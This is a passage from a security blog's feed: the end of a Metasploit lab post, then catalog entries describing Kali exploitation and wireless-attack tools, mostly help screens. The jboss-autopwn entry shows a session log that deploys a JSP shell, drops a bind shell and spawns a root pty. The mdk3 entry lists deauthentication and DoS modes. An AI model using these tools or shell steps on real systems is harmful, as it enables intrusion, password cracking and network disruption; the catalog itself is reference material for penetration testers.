```</p>

<p>Success! This demo was pretty straightforward, but if executables attract too much attention on the target, you can try to sneak your payload into PDFs or Word documents instead.</p>

<h5>Conclusion</h5>

<p>This was a long post, but I wanted to showcase many of Metasploit&rsquo;s capabilities. It was a fun lab, but I barely scratched the surface of what&rsquo;s possible.</p>

<p>``` plain</p>

<hr />

<p>/ Don&rsquo;t hate yourself in the morning &mdash; \
\ sleep till noon.                      /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kali tools catalog - Exploitation Tools]]></title>
    <link href="http://chousensha.github.io/blog/2015/06/01/kali-tools-catalog-exploitation-tools/"/>
    <updated>2015-06-01T10:56:26-04:00</updated>
    <id>http://chousensha.github.io/blog/2015/06/01/kali-tools-catalog-exploitation-tools</id>
    <content type="html"><![CDATA[<h3>BeEF XSS Framework</h3>

<p><strong>beef</strong></p>

<p>BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser.</p>

<p>Amid growing concerns about web-borne attacks against clients, including mobile clients, BeEF allows the professional penetration tester to assess the actual security posture of a target environment by using client-side attack vectors. Unlike other security frameworks, BeEF looks past the hardened network perimeter and client system, and examines exploitability within the context of the one open door: the web browser. BeEF will hook one or more web browsers and use them as beachheads for launching directed command modules and further attacks against the system from within the browser context.</p>

<!-- more -->


<p><img class="center" src="/images/kali/exploit/beef.png" title="&lsquo;beef&rsquo; &lsquo;beef&rsquo;" ></p>

<h3>Exploit Database</h3>

<p><strong>searchsploit</strong></p>

<p>Exploit Database Archive Search</p>

<p>``` plain
Usage: searchsploit [options] term1 [term2] &hellip; [termN]
Example: searchsploit oracle windows local</p>

<p>=========</p>

<h1> Options </h1>

<p>   -c            Perform case-sensitive searches; by default, searches will</p>

<pre><code>             try to be greedy
</code></pre>

<p>   -h, &mdash;help    Show help screen
   -v            By setting verbose output, description lines are allowed to</p>

<pre><code>             overflow their columns
</code></pre>

<p>=======</p>

<h1> NOTES </h1>

<ul>
<li>Use any number of search terms you would like (minimum: 1)</li>
<li>Search terms are not case sensitive, and order is irrelevant
```</li>
</ul>


<h3>Exploit Development Tools</h3>

<p><strong>edb-debugger</strong></p>

<p>A Linux equivalent of the famous Olly debugger on the Windows platform. Some of its features are:</p>

<ul>
<li><p>Intuitive GUI interface</p></li>
<li><p>The usual debugging operations (step-into/step-over/run/break)</p></li>
<li><p>Conditional breakpoints</p></li>
<li><p>Debugging core is implemented as a plugin so people can have drop in replacements. Of course if a given platform has several debugging APIs available, then you may have a plugin that implements any of them.</p></li>
<li><p>Basic instruction analysis</p></li>
<li><p>View/Dump memory regions</p></li>
<li><p>Effective address inspection</p></li>
<li><p>The data dump view is tabbed, allowing you to have several views of memory open at the same time and quickly switch between them.</p></li>
<li><p>Importing and generation of symbol maps</p></li>
<li><p>Plugins</p></li>
</ul>


<p><img class="center" src="/images/kali/exploit/edb.png" title="&lsquo;edb-debugger&rsquo; &lsquo;edb&rsquo;" ></p>

<p><strong>NASM shell</strong></p>

<p>This tool provides an easy way to see what opcodes are associated with
certain x86 instructions by making use of nasm if it is installed and
reachable through the PATH environment variable.</p>

<p><strong>ollydbg</strong></p>

<p>OllyDbg is a 32-bit assembler level analysing debugger for Microsoft Windows. Emphasis on binary code analysis makes it particularly useful in cases where source is unavailable.</p>

<p>Features:</p>

<ul>
<li><p>Intuitive user interface, no cryptical commands</p></li>
<li><p>Code analysis – traces registers, recognizes procedures, loops, API calls, switches, tables, constants and strings</p></li>
<li><p>Directly loads and debugs DLLs</p></li>
<li><p>Object file scanning – locates routines from object files and libraries</p></li>
<li><p>Allows for user-defined labels, comments and function descriptions</p></li>
<li><p>Understands debugging information in Borland® format</p></li>
<li><p>Saves patches between sessions, writes them back to executable file and updates fixups</p></li>
<li><p>Open architecture – many third-party plugins are available</p></li>
<li><p>No installation – no trash in registry or system directories</p></li>
<li><p>Debugs multithread applications</p></li>
<li><p>Attaches to running programs</p></li>
<li><p>Configurable disassembler, supports both MASM and IDEAL formats</p></li>
<li><p>MMX, 3DNow! and SSE data types and instructions, including Athlon extensions</p></li>
<li><p>Full UNICODE support</p></li>
<li><p>Dynamically recognizes ASCII and UNICODE strings – also in Delphi format!</p></li>
<li><p>Recognizes complex code constructs, like call to jump to procedure</p></li>
<li><p>Decodes calls to more than 1900 standard API and 400 C functions</p></li>
<li><p>Gives context-sensitive help on API functions from external help file</p></li>
<li><p>Sets conditional, logging, memory and hardware breakpoints</p></li>
<li><p>Traces program execution, logs arguments of known functions</p></li>
<li><p>Shows fixups</p></li>
<li><p>Dynamically traces stack frames</p></li>
<li><p>Searches for imprecise commands and masked binary sequences</p></li>
<li><p>Searches whole allocated memory</p></li>
<li><p>Finds references to constant or address range</p></li>
<li><p>Examines and modifies memory, sets breakpoints and pauses program on-the-fly</p></li>
<li><p>Assembles commands into the shortest binary form</p></li>
<li><p>Starts from the floppy disk</p></li>
</ul>


<p><img class="center" src="/images/kali/exploit/ollydbg.png" title="&lsquo;ollydbg&rsquo; &lsquo;ollydbg&rsquo;" ></p>

<p><strong>pattern create</strong></p>

<p>Generate a string composed of unique patterns</p>

<p><code>plain
root@kali:/usr/share/metasploit-framework/tools# ./pattern_create.rb 25
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7A
</code></p>

<p><strong>pattern offset</strong></p>

<p>Find the offset in an exploit string where your address to overwrite EIP should be</p>

<p><code>plain
Usage: pattern_offset.rb &lt;search item&gt; &lt;length of buffer&gt;
Default length of buffer if none is inserted: 8192
This buffer is generated by pattern_create() in the Rex library automatically
</code></p>

<h3>Metasploit</h3>

<p>World&rsquo;s most used penetration testing software&hellip;the hacker&rsquo;s best friend. No further description needed</p>

<p>``` plain
root@kali:~# msfconsole
[*] Starting the Metasploit Framework console&hellip;|
Call trans opt: received. 2-19-98 13:24:18 REC:Loc</p>

<pre><code> Trace program: running

       wake up, Neo...
    the matrix has you
  follow the white rabbit.

      knock, knock, Neo.

                    (`.         ,-,
                    ` `.    ,;' /
                     `.  ,'/ .'
                      `. X /.'
            .-;--''--.._` ` (
          .'            /   `
         ,           ` '   Q '
         ,         ,   `._    \
      ,.|         '     `-.;_'
      :  . `  ;    `  ` --,.._;
       ' `    ,   )   .'
          `._ ,  '   /_
             ; ,''-,;' ``-
              ``-..__``--`

                         http://metasploit.pro
</code></pre>

<p>Validate lots of vulnerabilities to demonstrate exposure
with Metasploit Pro &mdash; Learn more on <a href="http://rapid7.com/metasploit">http://rapid7.com/metasploit</a></p>

<pre><code>   =[ metasploit v4.11.0-2015013101 [core:4.11.0.pre.2015013101 api:1.0.0]]
</code></pre>

<ul>
<li>&mdash; &mdash;=[ 1399 exploits &ndash; 788 auxiliary &ndash; 224 post        ]</li>
<li>&mdash; &mdash;=[ 356 payloads &ndash; 37 encoders &ndash; 8 nops             ]</li>
<li>&mdash; &mdash;=[ Free Metasploit Pro trial: <a href="http://r-7.co/trymsp">http://r-7.co/trymsp</a> ]</li>
</ul>


<p>msf >
```</p>

<h3>Network Exploitation</h3>

<p><strong>armitage</strong></p>

<p>Armitage is a scriptable red team collaboration tool for Metasploit that visualizes targets, recommends exploits, and exposes the advanced post-exploitation features in the framework.</p>

<p>Through one Metasploit instance, your team will:</p>

<ul>
<li><p>Use the same sessions</p></li>
<li><p>Share hosts, captured data, and downloaded files</p></li>
<li><p>Communicate through a shared event log.</p></li>
<li><p>Run bots to automate red team tasks.</p></li>
</ul>


<p>Armitage organizes Metasploit&rsquo;s capabilities around the hacking process. There are features for discovery, access, post-exploitation, and maneuver.</p>

<p><img class="center" src="/images/kali/exploit/armitage.png" title="&lsquo;armitage&rsquo; &lsquo;armitage&rsquo;" ></p>

<p><strong>exploit6</strong></p>

<p>Performs exploits of various CVE known IPv6 vulnerabilities on the destination</p>

<p>``` plain
exploit6 v2.5 &copy; 2013 by van Hauser / THC <a href="&#109;&#97;&#105;&#108;&#x74;&#111;&#58;&#118;&#x68;&#64;&#x74;&#104;&#99;&#x2e;&#111;&#114;&#103;">&#118;&#104;&#64;&#116;&#x68;&#x63;&#46;&#x6f;&#x72;&#103;</a> www.thc.org</p>

<p>Syntax: exploit6 interface destination [test-case-number]</p>

<p>Performs exploits of various CVE known IPv6 vulnerabilities on the destination
Note that for exploitable overflows only &lsquo;AAA&hellip;&rsquo; strings are used.
If a system is vulnerable, it will crash, so be careful!
```</p>

<p><strong>ikat</strong></p>

<p>iKAT is designed to provide access to the underlying operating system of a Kiosk terminal by invoking native OS functionality.</p>

<p><strong>jboss-autopwn</strong></p>

<p>This JBoss script deploys a JSP shell on the target JBoss AS server. Once deployed, the script uses its upload and command execution capability to provide an interactive session.</p>

<p>Features include:</p>

<ul>
<li><p>Multiplatform support – tested on Windows, Linux and Mac targets</p></li>
<li><p>Support for bind and reverse bind shells</p></li>
<li><p>Meterpreter shells and VNC support for Windows targets</p></li>
</ul>


<p><a href="https://github.com/SpiderLabs/jboss-autopwn">Example from the homepage</a>:</p>

<p>``` plain
Linux bind shell:</p>

<p>[root@nitrogen jboss]# ./e.sh 192.168.1.2 8080 2>/dev/null
[x] Retrieving cookie
[x] Now creating BSH script&hellip;
[x] .war file created successfully in /tmp
[x] Now deploying .war file:
<a href="http://192.168.1.2:8080/browser/browser/browser.jsp">http://192.168.1.2:8080/browser/browser/browser.jsp</a>
[x] Running as user&hellip;:
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
[x] Server uname&hellip;:
 Linux nitrogen 2.6.29.6-213.fc11.x86_64 #1 SMP Tue Jul 7 21:02:57 EDT 2009 x86_64 x86_64 x86_64 GNU/Linux
[!] Would you like to upload a reverse or a bind shell? bind
[!] On which port would you like the bindshell to listen on? 31337
[x] Uploading bind shell payload..
[x] Verifying if upload was successful&hellip;
-rwxrwxrwx 1 root root 172 2009-11-22 19:48 /tmp/payload
[x] You should have a bind shell on 192.168.1.2:31337..
[x] Dropping you into a shell&hellip;
Connection to 192.168.1.2 31337 port [tcp/*] succeeded!
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;
[root@nitrogen /]# full interactive shell :&ndash;)
```</p>

<p><strong>termineter</strong></p>

<p>Termineter is a framework written in python to provide a platform for the security testing of smart meters. It implements the C12.18 and C12.19 protocols for communication. Currently supported are Meters using C12.19 with 7-bit character sets. Termineter communicates with Smart Meters via a connection using an ANSI type-2 optical probe with a serial interface.</p>

<p>``` plain
root@kali:~# termineter</p>

<hr />

<p>  /<em>  <strong>/</strong> </em><strong><strong><em> _  (</em>)</strong>  </strong><em> / /</em><em><strong> </strong>__
   / / / &ndash;</em>) <strong>/  &lsquo; \/ / _ \/ &ndash;_) </strong>/ &ndash;<em>) __/
  /</em>/  _<em>/</em>/ /<em>/</em>/<em>/</em>/<em>//</em>/_<em>/_</em>/_<em>/</em>/</p>

<p>  &lt;[ termineter                     v0.1.0
  &lt;[ model:                          T-800
  &lt;[ loaded modules:                    12</p>

<p>termineter > show modules</p>

<h1>Modules</h1>

<p>  Name               Description</p>

<hr />

<p>  brute_force_login  Brute Force Credentials
  dump_tables        Dump Readable C12.19 Tables From The Device To A CSV File
  enum_tables        Enumerate Readable C12.19 Tables From The Device
  get_info           Get Basic Meter Information By Reading Tables
  get_log_info       Get Information About The Meter&rsquo;s Logs
  get_modem_info     Get Information About The Integrated Modem
  get_security_info  Get Information About The Meter&rsquo;s Access Control
  read_table         Read Data From A C12.19 Table
  run_procedure      Initiate A Custom Procedure
  set_meter_id       Set The Meter&rsquo;s I.D.
  set_meter_mode     Change the Meter&rsquo;s Operating Mode
  write_table        Write Data To A C12.19 Table</p>

<p>termineter >
```</p>

<h3>Social Engineering Toolkit</h3>

<p>The Social-Engineer Toolkit is an open-source penetration testing framework designed for Social-Engineering. SET has a number of custom attack vectors that allow you to make a believable attack in a fraction of the time.</p>

<p>``` plain</p>

<pre><code>      _______________________________
     /   _____/\_   _____/\__    ___/
     \_____  \  |    __)_   |    |
     /        \ |        \  |    |
    /_______  //_______  /  |____|
            \/         \/            
</code></pre>

<p>[&mdash;&ndash;]        The Social-Engineer Toolkit (SET)         [&mdash;&ndash;]
[&mdash;&ndash;]        Created by: David Kennedy (ReL1K)         [&mdash;&ndash;]
[&mdash;&ndash;]                  Version: 6.3                    [&mdash;&ndash;]
[&mdash;&ndash;]              Codename: &lsquo;#HugLife&rsquo;                [&mdash;&ndash;]
[&mdash;&ndash;]        Follow us on Twitter: @TrustedSec         [&mdash;&ndash;]
[&mdash;&ndash;]        Follow me on Twitter: @HackingDave        [&mdash;&ndash;]
[&mdash;&ndash;]       Homepage: <a href="https://www.trustedsec.com">https://www.trustedsec.com</a>       [&mdash;&ndash;]</p>

<pre><code>    Welcome to the Social-Engineer Toolkit (SET). 
     The one stop shop for all of your SE needs.

 Join us on irc.freenode.net in channel #setoolkit
</code></pre>

<p>   The Social-Engineer Toolkit is a product of TrustedSec.</p>

<pre><code>         Visit: https://www.trustedsec.com
</code></pre>

<p> Select from the menu:</p>

<p>   1) Social-Engineering Attacks
   2) Fast-Track Penetration Testing
   3) Third Party Modules
   4) Update the Social-Engineer Toolkit
   5) Update SET configuration
   6) Help, Credits, and About</p>

<p>  99) Exit the Social-Engineer Toolkit</p>

<p>set>
```</p>

<p><img class="center" src="/images/kali/exploit/cookie.png" title="&lsquo;cookie&rsquo; &lsquo;cookie&rsquo;" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kali tools catalog - Wireless Attacks]]></title>
    <link href="http://chousensha.github.io/blog/2015/04/20/kali-tools-catalog-wireless-attacks/"/>
    <updated>2015-04-20T09:31:23-04:00</updated>
    <id>http://chousensha.github.io/blog/2015/04/20/kali-tools-catalog-wireless-attacks</id>
    <content type="html"><![CDATA[<h3>802.11 Wireless Tools</h3>

<p><strong>aircrack-ng</strong></p>

<p>aircrack-ng is an 802.11 WEP and WPA/WPA2-PSK key cracking program.
It can recover the WEP key once enough encrypted packets have been captured with airodump-ng. This part of the aircrack-ng  suite  determines
the  WEP key using two fundamental methods. The first method is via the
PTW approach (Pyshkin, Tews, Weinmann). The main advantage of  the  PTW
approach  is  that  very few data packets are required to crack the WEP
key. The second method is the FMS/KoreK method.  The  FMS/KoreK  method
incorporates  various  statistical  attacks to discover the WEP key and
uses these in combination with brute forcing.</p>

<!-- more -->


<p>Additionally, the program offers a dictionary  method  for  determining
the WEP key. For cracking WPA/WPA2 pre-shared keys, a wordlist (file or
stdin) or an airolib-ng has to be used.</p>

<p>``` plain
  Aircrack-ng 1.2 rc1 &ndash; &copy; 2006-2013 Thomas d'Otreppe
  <a href="http://www.aircrack-ng.org">http://www.aircrack-ng.org</a></p>

<p>  usage: aircrack-ng [options] &lt;.cap / .ivs file(s)></p>

<p>  Common options:</p>

<pre><code>  -a &lt;amode&gt; : force attack mode (1/WEP, 2/WPA-PSK)
  -e &lt;essid&gt; : target selection: network identifier
  -b &lt;bssid&gt; : target selection: access point's MAC
  -p &lt;nbcpu&gt; : # of CPU to use  (default: all CPUs)
  -q         : enable quiet mode (no status output)
  -C &lt;macs&gt;  : merge the given APs to a virtual one
  -l &lt;file&gt;  : write key to file
</code></pre>

<p>  Static WEP cracking options:</p>

<pre><code>  -c         : search alpha-numeric characters only
  -t         : search binary coded decimal chr only
  -h         : search the numeric key for Fritz!BOX
  -d &lt;mask&gt;  : use masking of the key (A1:XX:CF:YY)
  -m &lt;maddr&gt; : MAC address to filter usable packets
  -n &lt;nbits&gt; : WEP key length :  64/128/152/256/512
  -i &lt;index&gt; : WEP key index (1 to 4), default: any
  -f &lt;fudge&gt; : bruteforce fudge factor,  default: 2
  -k &lt;korek&gt; : disable one attack method  (1 to 17)
  -x or -x0  : disable bruteforce for last keybytes
  -x1        : last keybyte bruteforcing  (default)
  -x2        : enable last  2 keybytes bruteforcing
  -y         : experimental  single bruteforce mode
  -K         : use only old KoreK attacks (pre-PTW)
  -s         : show the key in ASCII while cracking
  -M &lt;num&gt;   : specify maximum number of IVs to use
  -D         : WEP decloak, skips broken keystreams
  -P &lt;num&gt;   : PTW debug:  1: disable Klein, 2: PTW
  -1         : run only 1 try to crack key with PTW
</code></pre>

<p>  WEP and WPA-PSK cracking options:</p>

<pre><code>  -w &lt;words&gt; : path to wordlist(s) filename(s)
</code></pre>

<p>  WPA-PSK options:</p>

<pre><code>  -E &lt;file&gt;  : create EWSA Project file v3
  -J &lt;file&gt;  : create Hashcat Capture file
  -S         : WPA cracking speed test
  -r &lt;DB&gt;    : path to airolib-ng database
               (Cannot be used with -w)
</code></pre>

<p>  Other options:</p>

<pre><code>  -u         : Displays # of CPUs &amp; MMX/SSE support
  --help     : Displays this usage screen
</code></pre>

<p>```</p>

<p><strong>asleap</strong></p>

<p>Actively recover LEAP/PPTP passwords</p>

<p><img class="center" src="/images/kali/wifi/asleap.png" title="&lsquo;asleap&rsquo; &lsquo;asleap&rsquo;" ></p>

<p><strong>bully</strong></p>

<p>Bully is a new implementation of the WPS brute force attack, written in C. It is conceptually identical to other programs, in that it exploits the (now well known) design flaw in the WPS specification. It has several advantages over the original reaver code. These include fewer dependencies, improved memory and cpu performance, correct handling of endianness, and a more robust set of options. It runs on Linux, and was specifically developed to run on embedded Linux systems (OpenWrt, etc) regardless of architecture.</p>

<p>Bully provides several improvements in the detection and handling of anomalous scenarios. It has been tested against access points from numerous vendors, and with differing configurations, with much success.</p>

<p>``` plain
  usage: bully <options> interface</p>

<p>  Required arguments:</p>

<pre><code>  interface      : Wireless interface in monitor mode (root required)

  -b, --bssid macaddr    : MAC address of the target access point
</code></pre>

<p>   Or</p>

<pre><code>  -e, --essid string     : Extended SSID for the access point
</code></pre>

<p>  Optional arguments:</p>

<pre><code>  -c, --channel N[,N...] : Channel number of AP, or list to hop [b/g]
  -i, --index N          : Starting pin index (7 or 8 digits)  [Auto]
  -l, --lockwait N       : Seconds to wait if the AP locks WPS   [43]
  -o, --outfile file     : Output file for messages          [stdout]
  -p, --pin N            : Starting pin number (7 or 8 digits) [Auto]
  -s, --source macaddr   : Source (hardware) MAC address      [Probe]
  -v, --verbosity N      : Verbosity level 1-3, 1 is quietest     [3]
  -w, --workdir path     : Location of pin/session files  [~/.bully/]
  -5, --5ghz             : Hop on 5GHz a/n default channel list  [No]
  -B, --bruteforce       : Bruteforce the WPS pin checksum digit [No]
  -F, --force            : Force continue in spite of warnings   [No]
  -S, --sequential       : Sequential pins (do not randomize)    [No]
  -T, --test             : Test mode (do not inject any packets) [No]
</code></pre>

<p>  Advanced arguments:</p>

<pre><code>  -a, --acktime N        : Deprecated/ignored                  [Auto]
  -r, --retries N        : Resend packets N times when not acked  [2]
  -m, --m13time N        : Deprecated/ignored                  [Auto]
  -t, --timeout N        : Deprecated/ignored                  [Auto]
  -1, --pin1delay M,N    : Delay M seconds every Nth nack at M5 [0,1]
  -2, --pin2delay M,N    : Delay M seconds every Nth nack at M7 [5,1]
  -A, --noacks           : Disable ACK check for sent packets    [No]
  -C, --nocheck          : Skip CRC/FCS validation (performance) [No]
  -D, --detectlock       : Detect WPS lockouts unreported by AP  [No]
  -E, --eapfail          : EAP Failure terminate every exchange  [No]
  -L, --lockignore       : Ignore WPS locks reported by the AP   [No]
  -M, --m57nack          : M5/M7 timeouts treated as WSC_NACK's  [No]
  -N, --nofcs            : Packets don't contain the FCS field [Auto]
  -P, --probe            : Use probe request for nonbeaconing AP [No]
  -R, --radiotap         : Assume radiotap headers are present [Auto]
  -W, --windows7         : Masquerade as a Windows 7 registrar   [No]
  -Z, --suppress         : Suppress packet throttling algorithm  [No]
  -V, --version          : Print version info and exit
  -h, --help             : Display this help information
</code></pre>

<p>```</p>

<p><strong>cowpatty</strong></p>

<p>Implementation of an offline dictionary attack against WPA/WPA2 networks using PSK-based authentication (e.g. WPA-Personal). Many enterprise networks deploy PSK-based authentication mechanisms for WPA/WPA2 since it is much easier than establishing the necessary RADIUS, supplicant and certificate authority architecture needed for WPA-Enterprise authentication. Cowpatty can implement an accelerated attack if a precomputed PMK file is available for the SSID that is being assessed.</p>

<p><img class="center" src="/images/kali/wifi/cowpatty.png" title="&lsquo;cowpatty&rsquo; &lsquo;cowpatty&rsquo;" ></p>

<p><strong>eapmd5pass</strong></p>

<p>EAP-MD5 is a legacy authentication mechanism that does not provide sufficient protection for user authentication credentials. Users who authenticate using EAP-MD5 subject themselves to an offline dictionary attack vulnerability. This tool reads from a live network interface in monitor-mode, or from a stored libpcap capture file, and extracts the portions of the EAP-MD5 authentication exchange. Once the challenge and response portions have been collected from this exchange, eapmd5pass will mount an offline dictionary attack against the user’s password.</p>

<p><img class="center" src="/images/kali/wifi/eapmd5pass.png" title="&lsquo;eapmd5pass&rsquo; &lsquo;eapmd5pass&rsquo;" ></p>

<p><strong>fern-wifi-cracker</strong></p>

<p>Fern Wifi Cracker is a Wireless security auditing and attack software program written using the Python Programming Language and the Python Qt GUI library, the program is able to crack and recover WEP/WPA/WPS keys and also run other network based attacks on wireless or ethernet based networks.</p>

<p>Fern Wifi Cracker currently supports the following features:</p>

<ul>
<li><p>WEP Cracking with Fragmentation,Chop-Chop, Caffe-Latte, Hirte, ARP Request Replay or WPS attack</p></li>
<li><p>WPA/WPA2 Cracking with Dictionary or WPS based attacks</p></li>
<li><p>Automatic saving of key in database on successful crack</p></li>
<li><p>Automatic Access Point Attack System</p></li>
<li><p>Session Hijacking (Passive and Ethernet Modes)</p></li>
<li><p>Access Point MAC Address Geo Location Tracking</p></li>
<li><p>Internal MITM Engine</p></li>
<li><p>Bruteforce Attacks (HTTP,HTTPS,TELNET,FTP)</p></li>
<li><p>Update Support</p></li>
</ul>


<p><img class="center" src="/images/kali/wifi/fern-wifi-cracker.png" title="&lsquo;fern-wifi-cracker&rsquo; &lsquo;fern-wifi-cracker&rsquo;" ></p>

<p><strong>genkeys</strong></p>

<p>Generates lookup file for asleap</p>

<p>``` plain
genkeys 2.2 &ndash; generates lookup file for asleap. <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#x6f;&#58;&#x6a;&#x77;&#114;&#105;&#x67;&#x68;&#116;&#64;&#x68;&#x61;&#x73;&#98;&#x6f;&#x72;&#103;&#x2e;&#x63;&#111;&#x6d;">&#106;&#119;&#114;&#105;&#103;&#x68;&#x74;&#x40;&#x68;&#97;&#x73;&#98;&#111;&#114;&#103;&#46;&#x63;&#111;&#109;</a>
genkeys: Must supply -r -f and -n
Usage: genkeys [options]</p>

<pre><code>-r  Input dictionary file, one word per line
-f  Output pass+hash filename
-n  Output index filename
-h  Last 2 hash bytes to filter with (optional)
</code></pre>

<p>```</p>

<p><strong>genpmk</strong></p>

<p>WPA-PSK precomputation attack</p>

<p><img class="center" src="/images/kali/wifi/genpmk.png" title="&lsquo;genpmk&rsquo; &lsquo;genpmk&rsquo;" ></p>

<p><strong>giskismet</strong></p>

<p>GISKismet is a wireless recon visualization tool to represent data gathered using Kismet in a flexible manner. GISKismet stores the information in a database so that the user can generate graphs using SQL. GISKismet currently uses SQLite for the database and GoogleEarth / KML files for graphing.</p>

<p>``` plain
Usage: giskismet [Options]</p>

<p>Input File:</p>

<pre><code>   --csv &lt;csv-file&gt;             Parse the input from Kismet-devel CSV
</code></pre>

<p>   -x  &mdash;xml &lt;xml-file>             Parse the input from Kismet-newcore NETXML</p>

<p>Input Filters:</p>

<pre><code>   --bssid file | list          Filter based on BSSID     
   --essid file | list          Filter based on ESSID 
   --encryption file | list     Filter based on Encryption 
   --channel file | list        Filter based on Channel
</code></pre>

<p>file | list (list = comma separated lists(needs quotes)</p>

<p>Kismet-newcore Options:
   -a  &mdash;ap                         Insert only the APs</p>

<p>Query
   -q  &mdash;query [sql]                SQL query
   -m  &mdash;manual [csv]               CSV output of manual SQL query</p>

<p>   -o  &mdash;output [file]              Output filename
   -n  &mdash;name [str]                 Name of the KML layer</p>

<pre><code>   --desc [str]                 Description of the KML layer
</code></pre>

<p>General Options:</p>

<pre><code>   --ignore-gps                 Import data even when GPS fields are missing
   --database [file]            SQLite3 database name [default: wireless.dbl]
</code></pre>

<p>   -d  &mdash;debug [num]                Display debug information
   -s  &mdash;silent                     No output when adding APs
   -v  &mdash;version                    Display version
   -h  &mdash;help                       Display this information</p>

<p>Send Comments to Joshua &ldquo;Jabra&rdquo; Abraham ( <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#x6a;&#97;&#98;&#114;&#x61;&#x40;&#115;&#112;&#x6c;&#x30;&#x69;&#116;&#46;&#x6f;&#114;&#x67;">&#x6a;&#97;&#x62;&#x72;&#97;&#64;&#x73;&#x70;&#x6c;&#x30;&#105;&#x74;&#46;&#x6f;&#114;&#103;</a> )
```</p>

<p><strong>kismet</strong></p>

<p>Kismet is an 802.11 layer2 wireless network detector, sniffer, and intrusion detection system. Kismet will work with any wireless card which supports raw monitoring (rfmon) mode, and (with appropriate hardware) can sniff 802.11b, 802.11a, 802.11g, and 802.11n traffic. Kismet also supports plugins which allow sniffing other media such as DECT.</p>

<p>Kismet identifies networks by passively collecting packets and detecting standard named networks, detecting (and given time, decloaking) hidden networks, and infering the presence of nonbeaconing networks via data traffic.</p>

<p>Kismet supports logging to the wtapfile packet format (readable by tcpdump and ethereal) and saves detected network information as plaintext,
CSV, and XML.  kismet is capable of using any GPS supported by gpsd and
logs and plots network data.</p>

<p><img class="center" src="/images/kali/wifi/kismet.png" title="&lsquo;kismet&rsquo; &lsquo;kismet&rsquo;" ></p>

<p><strong>mdk3</strong></p>

<p>MDK is a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.</p>

<p>``` plain
MDK 3.0 v6 &ndash; &ldquo;Yeah, well, whatever&rdquo;
by ASPj of k2wrlz, using the osdep library from aircrack-ng
And with lots of help from the great aircrack-ng community:
Antragon, moongray, Ace, Zero_Chaos, Hirte, thefkboss, ducttape,
telek0miker, Le_Vert, sorbo, Andy Green, bahathir and Dawid Gajownik
THANK YOU!</p>

<p>MDK is a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.
IMPORTANT: It is your responsibility to make sure you have permission from the
network owner before running MDK against it.</p>

<p>This code is licenced under the GPLv2</p>

<p>MDK USAGE:
mdk3 <interface> &lt;test_mode> [test_options]</p>

<p>Try mdk3 &mdash;fullhelp for all test options
Try mdk3 &mdash;help &lt;test_mode> for info about one test only</p>

<p>TEST MODES:
b   &ndash; Beacon Flood Mode</p>

<pre><code>  Sends beacon frames to show fake APs at clients.
  This can sometimes crash network scanners and even drivers!
</code></pre>

<p>a   &ndash; Authentication DoS mode</p>

<pre><code>  Sends authentication frames to all APs found in range.
  Too much clients freeze or reset some APs.
</code></pre>

<p>p   &ndash; Basic probing and ESSID Bruteforce mode</p>

<pre><code>  Probes AP and check for answer, useful for checking if SSID has
  been correctly decloaked or if AP is in your adaptors sending range
  SSID Bruteforcing is also possible with this test mode.
</code></pre>

<p>d   &ndash; Deauthentication / Disassociation Amok Mode</p>

<pre><code>  Kicks everybody found from AP
</code></pre>

<p>m   &ndash; Michael shutdown exploitation (TKIP)</p>

<pre><code>  Cancels all traffic continuously
</code></pre>

<p>x   &ndash; 802.1X tests
w   &ndash; WIDS/WIPS Confusion</p>

<pre><code>  Confuse/Abuse Intrusion Detection and Prevention Systems
</code></pre>

<p>f   &ndash; MAC filter bruteforce mode</p>

<pre><code>  This test uses a list of known client MAC Adresses and tries to
  authenticate them to the given AP while dynamically changing
  its response timeout for best performance. It currently works only
  on APs who deny an open authentication request properly
</code></pre>

<p>g   &ndash; WPA Downgrade test</p>

<pre><code>  deauthenticates Stations and APs sending WPA encrypted packets.
  With this test you can check if the sysadmin will try setting his
  network to WEP or disable encryption.
</code></pre>

<p>```</p>

<p><strong>wifiarp</strong></p>

<p>Wifi injection ARP answering tool based on Wifitap</p>

<p><strong>wifidns</strong></p>

<p>Wifi injection DNS answering tool based on Wifitap</p>

<p>``` plain
root@kali:~# wifidns -h
Psyco optimizer not installed, running anyway&hellip;
INFO: did not find python gnuplot wrapper . Won&rsquo;t be able to plot
INFO: Can&rsquo;t open /etc/ethertypes file
Usage: wifidns -b <BSSID> -a <IP> [-o <iface>] [-i <iface>]</p>

<pre><code>                      [-s &lt;SMAC&gt;] [-t &lt;TTL&gt;] [-w &lt;WEP key&gt;]
                      [-k &lt;key id&gt;]] [-d [-v]] [-h]
 -b &lt;BSSID&gt;    specify BSSID for injection
 -a &lt;IP&gt;       specify IP address for DNS answers
 -t &lt;TTL&gt;      Set TTL (default: 64)
 -o &lt;iface&gt;    specify interface for injection (default: ath0)
 -i &lt;iface&gt;    specify interface for listening (default: ath0)
 -s &lt;SMAC&gt;     specify source MAC address for injected frames
 -w &lt;key&gt;      WEP mode and key
 -k &lt;key id&gt;   WEP key id (default: 0)
 -d            activate debug
 -v            verbose debugging
 -h            this so helpful output
</code></pre>

<p>```</p>

<p><strong>wifi-honey</strong></p>

<p>This script creates five monitor mode interfaces, four are used as APs and the fifth is used for airodump-ng. To make things easier, rather than having five windows all this is done in a screen session which allows you to switch between screens to see what is going on. All sessions are labelled so you know which is which.</p>

<p>``` plain
Usage: /usr/bin/wifi-honey <essid> <channel> <interface></p>

<p>Default channel is 1
Default interface is wlan0</p>

